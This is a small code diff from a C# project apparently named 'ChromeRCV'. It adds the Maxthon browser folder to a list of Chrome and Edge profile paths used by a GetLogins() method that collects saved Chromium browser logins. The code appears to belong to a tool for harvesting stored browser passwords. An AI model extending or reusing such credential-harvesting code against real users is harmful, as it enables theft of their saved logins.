@@ -12,7 +12,8 @@ namespace ChromeRCV
         {
             LocalAppdata + "\\Google\\Chrome",
             LocalAppdata + "\\Google(x86)\\Chrome",
-            LocalAppdata + "\\Microsoft\\Edge"
+            LocalAppdata + "\\Microsoft\\Edge",
+            LocalAppdata + "\\Maxthon\\Application"
         };
 
         public static Dictionary<string, List<ChromiumLogin>> GetLogins()
